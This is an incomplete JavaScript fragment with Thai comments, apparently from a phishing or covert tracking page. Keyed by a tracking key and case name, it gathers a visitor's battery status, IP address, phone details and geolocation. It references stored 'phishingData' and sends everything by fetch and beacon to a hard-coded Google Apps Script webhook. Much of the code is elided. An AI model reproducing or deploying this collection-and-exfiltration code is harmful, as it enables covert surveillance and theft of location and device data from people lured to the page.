...
function getUrlParameters() {
  try {
    ...
    const isPreview = urlParams.get('preview') === '1'; // เพิ่มการตรวจสอบโหมด preview
    
    // การตรวจสอบขั้นสูงสำหรับ zeroclick
    let finalSource = source;
    if (source === 'zeroclick') {
      console.log("Zeroclick preview mode detected");
      finalSource = "zeroclick";
    ...
    return { trackingKey, caseName, source: finalSource, isPreview };
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการดึงพารามิเตอร์:", error);
    return { trackingKey: "ไม่มีค่า", caseName: "ไม่ระบุ", source: "error", isPreview: false };
  }
}
  ...
  try {
    ...
    if (phishingDataStr) {
      ...
      if (!sessionStorage.getItem(sentKey)) {
        ...
        const webhookUrl = 'https://script.google.com/macros/s/AKfycbyU8e3BDOUfT9WfgI00wa5eOEILJcHhgruJxqT1GaJSWD9Z7zIkEzWkFIxcmrCHlZ4/exec';
...
(function() {
  ...
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
    console.error("ไม่พบ tracking key. หยุดการทำงาน.");
    return;
  }
  ...
  Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
    .then(() => {
      ...
      if (window.fetch) {
        fetch('https://script.google.com/macros/s/AKfycbyU8e3BDOUfT9WfgI00wa5eOEILJcHhgruJxqT1GaJSWD9Z7zIkEzWkFIxcmrCHlZ4/exec', {
          method: 'POST',
          headers: {
...
function sendDataWithBeacon(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyU8e3BDOUfT9WfgI00wa5eOEILJcHhgruJxqT1GaJSWD9Z7zIkEzWkFIxcmrCHlZ4/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
